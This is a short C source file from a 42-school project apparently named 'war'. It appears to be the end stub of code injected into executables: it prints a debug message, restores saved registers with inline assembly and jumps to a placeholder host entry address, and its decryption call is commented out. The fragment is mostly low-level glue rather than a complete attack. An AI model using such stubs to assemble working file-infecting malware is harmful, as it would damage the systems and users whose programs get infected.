/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cypher_end.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:19:24 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/25 20:02:35 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

void	cypher_end(t_data *data)
{
	/* if (data->context == true || data->context == false) */
	/* 	revert_one(&data->key, (char*)release, (size_t)cypher_end - (size_t)release); */

	char de[] = "cypher_end\n";
	_write(1, de, _strlen(de));
	(void)data;

	__asm__ __volatile__ (
		"pop rsp;"
		"pop rbp;"
		"pop r15;"
		"pop r14;"
		"pop r13;"
		"pop r12;"
		"pop r11;"
		"pop r10;"
		"pop r9;"
		"pop r8;"
		"pop rcx;"
		"pop rdx;"
		"pop rsi;"
		"pop rdi;"
		"pop rax;"
		"pop rbp;"
		"pop rbx;"
		"mov rsp, %0;"
		/* "mov rax, 60;" */ // patch exit
		/* "syscall;" */
		"jmp 0xcafeba;"
		:: "g"(data->rsp)
		);
}

void	end(void)
{
	return ;
}
